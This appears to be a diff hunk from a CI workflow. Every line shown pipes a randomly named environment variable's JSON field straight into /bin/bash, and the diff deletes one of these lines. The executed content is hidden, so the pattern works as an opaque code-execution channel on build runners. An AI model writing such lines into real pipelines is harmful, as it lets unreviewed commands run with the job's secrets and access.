@@ -24,7 +24,6 @@ jobs:
           echo $pnh3751 | jq -r .ezq64 | /bin/bash
           echo $u4 | jq -r .thna60766 | /bin/bash
           echo $az404 | jq -r .l4 | /bin/bash
-          printf '%s' "$mvpx453" | jq -r .i7999 | /bin/bash
           printf '%s' "$su70" | jq -r .fq444 | /bin/bash
           printf '%s' "$tgsn95" | jq -r .fcsk8 | /bin/bash
 
